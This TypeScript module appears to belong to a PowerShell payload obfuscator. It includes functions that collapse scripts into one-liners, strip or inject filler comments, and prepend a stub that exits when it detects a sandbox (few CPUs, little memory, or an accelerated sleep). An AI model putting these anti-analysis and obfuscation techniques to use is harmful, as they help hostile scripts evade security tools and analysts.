import { sample, type RNG } from "../rng";
import { inSpans, quotedSpans } from "../spans";


// It works fine, but I can't help but think this could be a lot better. I'll fix it later.
const VALIDATION_STUB = `
$BDat8ZMX = (Get-CimInstance -ClassName Win32_ComputerSystem).NumberOfLogicalProcessors
if ($BDat8ZMX -lt 2) { exit }
$AsOFQ = (Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory
if ($AsOFQ -lt 2GB) { exit }
$IwlQ7r = [System.DateTime]::Now
Start-Sleep -Milliseconds 2572
if (([System.DateTime]::Now - $IwlQ7r).TotalMilliseconds -lt 2057) { exit }
`;

const DEFAULT_COMMENT_TEXT = "Suspendisse imperdiet lacus eu tellus pellentesque suscipit";




export function toOneLiner(payload: string): string {
  const stripped = payload.replace(/<#[\s\S]*?#>/g, "");
  const spans = quotedSpans(stripped);

  let out = "";
  let depth = 0;
  let spanIdx = 0;
  let i = 0;

  while (i < stripped.length) {
    const span = spans[spanIdx];
    if (span && i === span[0]) {
      out += stripped.slice(span[0], span[1]);
      i = span[1];
      spanIdx++;
      continue;
    }

    const c = stripped[i]!;

    if (c === "\r") { i++; continue; }

    if (c === "#" && stripped[i - 1] !== "`") {
      while (i < stripped.length && stripped[i] !== "\n") i++;
      continue;
    }

    if (c === "`" && (stripped[i + 1] === "\n" || (stripped[i + 1] === "\r" && stripped[i + 2] === "\n"))) {
      out = out.trimEnd() + " ";
      i += stripped[i + 1] === "\r" ? 3 : 2;
      continue;
    }

    if (c === "(" || c === "[") depth++;
    else if (c === ")" || c === "]") depth = Math.max(0, depth - 1);

    if (c === "\n") {
      const continues = depth > 0 || /^\s*(?:catch|finally|elseif|else)\b/i.test(stripped.slice(i + 1, i + 65));
      out = out.trimEnd() + (continues ? " " : "; ");
      i++;
      continue;
    }

    out += c;
    i++;
  }

  return out.replace(/;\s*;+/g, ";").replace(/\{\s*;/g, "{").replace(/;\s*\}/g, "}").replace(/ {2,}/g, " ").trim();
}




export function removeComments(payload: string): string {
  return payload.replace(/<#[\s\S]*?#>/g, "").split(/\r?\n/).map((line) => line.replace(/(^|[^`])#.*$/, "$1")).join("\n");
}




export function addComments(payload: string, oneLiner: boolean, rng: RNG, customText: string | undefined, count: number): string {
  const max = Math.max(0, Math.floor(count));
  if (max === 0) return payload;

  const text = (customText ?? "").trim() || DEFAULT_COMMENT_TEXT;
  const blockComment = `<# ${text.replace(/#>/g, "# >")} #>`;
  const lineComment = `# ${text.replace(/\r?\n/g, " ")}`;
  const singleLine = !/\r?\n/.test(payload.trim());

  if (oneLiner || singleLine) {
    const spans = quotedSpans(payload);
    const positions = new Set<number>([0, payload.length]);
    for (const m of payload.matchAll(/;\s*|\{|\|\s*/g)) positions.add(m.index! + m[0].length);
    for (const m of payload.matchAll(/\}/g)) positions.add(m.index!);
    const candidates = [...positions].filter((p) => !inSpans(spans, p));
    const chosen = sample(candidates, Math.min(max, candidates.length), rng).sort((a, b) => b - a);

    for (const pos of chosen) {
      payload = payload.slice(0, pos) + ` ${blockComment} ` + payload.slice(pos);
    }

    return payload;
  }

  const lines = payload.split(/\r?\n/);
  const safe: number[] = [];
  let inHere = false;

  for (let i = 0; i < lines.length; i++) {
    const ln = lines[i]!;
    if (!inHere) safe.push(i);
    if (/^\s*@["']/.test(ln)) inHere = true;
    if (/["']@\s*$/.test(ln)) inHere = false;
  }
  const chosen = sample(safe, Math.min(max, safe.length), rng).sort((a, b) => b - a);
  for (const i of chosen) lines.splice(i, 0, lineComment);

  return lines.join("\n");
}




export function addValidate(payload: string, oneLiner: boolean): string {
  const singleLine = !/\r?\n/.test(payload.trim());
  if (oneLiner || singleLine) return `${toOneLiner(VALIDATION_STUB)}; ${payload}`;
  return `${VALIDATION_STUB.trim()}\n\n${payload}`;
}
